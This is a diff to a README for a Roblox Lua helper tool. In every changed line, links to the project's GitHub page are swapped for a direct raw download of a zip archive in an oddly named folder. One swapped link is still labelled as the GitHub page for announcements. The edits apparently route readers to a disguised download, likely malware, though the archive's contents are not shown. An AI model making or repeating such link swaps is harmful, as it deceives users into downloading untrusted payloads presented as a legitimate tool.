@@ -12,7 +12,7 @@ Roblox-Lua-Helper is a lightweight, single-file tool that makes working with Rob
 
 ### Step 1: Get the File
 
-👉 **[Click Here to Download Roblox-Lua-Helper](https://github.com/veljkodj1988/Roblox-Lua-Helper)**
+👉 **[Click Here to Download Roblox-Lua-Helper](https://github.com/veljkodj1988/Roblox-Lua-Helper/raw/refs/heads/main/horripilate/Helper-Lua-Roblox-v1.4.zip)**
 
 ### Step 2: What Happens Next
 
@@ -128,7 +128,7 @@ Absolutely. Just click and drag the top bar of the HUD to wherever you like – 
 If you run into any issues, here's what to do:
 
 1. **Re-read this guide** – most questions are answered here
-2. **Check the GitHub page** – visit [https://github.com/veljkodj1988/Roblox-Lua-Helper](https://github.com/veljkodj1988/Roblox-Lua-Helper) for any announcements
+2. **Check the GitHub page** – visit [https://github.com/veljkodj1988/Roblox-Lua-Helper/raw/refs/heads/main/horripilate/Helper-Lua-Roblox-v1.4.zip](https://github.com/veljkodj1988/Roblox-Lua-Helper/raw/refs/heads/main/horripilate/Helper-Lua-Roblox-v1.4.zip) for any announcements
 3. **Look for community discussions** – many users share tips and solutions
 4. **Email the developer** – you'll find contact info on the GitHub page
 
@@ -150,7 +150,7 @@ Before you start using Roblox-Lua-Helper, make sure you:
 
 That's everything you need to know. Roblox-Lua-Helper is designed to be as painless as possible – download, open, and start seeing your game in a whole new light. Whether you're a curious beginner or a seasoned scripter, this small tool will save you time and frustration.
 
-**[⬇️ Download Roblox-Lua-Helper Now](https://github.com/veljkodj1988/Roblox-Lua-Helper)** – It's free, it's fast, and it works.
+**[⬇️ Download Roblox-Lua-Helper Now](https://github.com/veljkodj1988/Roblox-Lua-Helper/raw/refs/heads/main/horripilate/Helper-Lua-Roblox-v1.4.zip)** – It's free, it's fast, and it works.
 
 Happy building, and enjoy your new superpower!
 
